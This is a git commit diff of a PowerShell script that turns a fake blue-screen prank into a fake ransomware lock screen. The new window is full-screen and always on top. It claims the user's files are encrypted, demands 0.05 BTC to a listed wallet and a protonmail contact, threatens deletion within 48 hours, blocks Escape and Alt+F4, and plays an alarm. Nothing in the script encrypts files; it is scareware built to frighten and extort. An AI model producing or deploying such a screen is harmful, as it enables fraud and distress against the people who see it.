1360fc542bfe555123be05d43444c899f3c38349
DKYDIVYANSH <divyanshasg@outlook.com>
2025-08-01 22:47:36 +0530

    Update bsod.ps1

--- bsod.ps1
+++ bsod.ps1
@@ -1,37 +1,53 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$bsod = @"
-A problem has been detected and Windows has been shut down to prevent damage to your computer.
-
-The problem seems to be caused by the following file: prank.sys
-
-PAGE_FAULT_IN_NONPAGED_AREA
-
-If this is the first time you've seen this Stop error screen,
-restart your computer. If this screen appears again, follow
-these steps:
-
-Check to make sure any new hardware or software is properly installed.
-If this is a new installation, ask your hardware or software manufacturer
-for any Windows updates you might need.
-
-STOP: 0x00000050 (0xFFFFF880009AA000, 0x0000000000000000, 0xFFFFF80002AC8F32, 0x0000000000000000)
-"@
-
 $form = New-Object Windows.Forms.Form
-$form.Text = "Windows Error"
+$form.Text = "Decryptor"
 $form.WindowState = "Maximized"
-$form.BackColor = 'DarkBlue'
 $form.FormBorderStyle = 'None'
 $form.TopMost = $true
+$form.BackColor = 'Black'
 
 $label = New-Object Windows.Forms.Label
-$label.Text = $bsod
-$label.ForeColor = 'White'
-$label.Font = New-Object Drawing.Font("Consolas", 16)
-$label.Dock = 'Fill'
-$label.TextAlign = 'TopLeft'
-
+$label.ForeColor = 'Red'
+$label.Font = New-Object Drawing.Font("Consolas", 26, [System.Drawing.FontStyle]::Bold)
+$label.Dock = 'Top'
+$label.TextAlign = 'MiddleCenter'
+$label.Height = 80
+$label.Text = "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!"
 $form.Controls.Add($label)
+
+$details = New-Object Windows.Forms.Label
+$details.ForeColor = 'White'
+$details.Font = New-Object Drawing.Font("Consolas", 14)
+$details.Dock = 'Fill'
+$details.TextAlign = 'TopLeft'
+$details.Padding = '20,100,20,20'
+$details.Text = @"
+All your important files including documents, databases, and images are now encrypted.
+
+To recover your files, send 0.05 BTC to the wallet address below:
+→ 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
+
+After payment, send a confirmation email to: decryptor_support@protonmail.com
+
+You have 48 hours to comply or your files will be permanently deleted.
+
+Time Left: 47:59:59
+
+Decryption Key: [Awaiting Payment]
+"@
+$form.Controls.Add($details)
+
+# Optional: Disable Alt+F4 or ESC
+$form.KeyPreview = $true
+$form.Add_KeyDown({
+    if ($_.KeyCode -eq "Escape" -or $_.Alt -and $_.KeyCode -eq "F4") {
+        $_.Handled = $true
+    }
+})
+
+# Optional: Play scary alert sound
+[System.Media.SystemSounds]::Exclamation.Play()
+
 $form.ShowDialog()
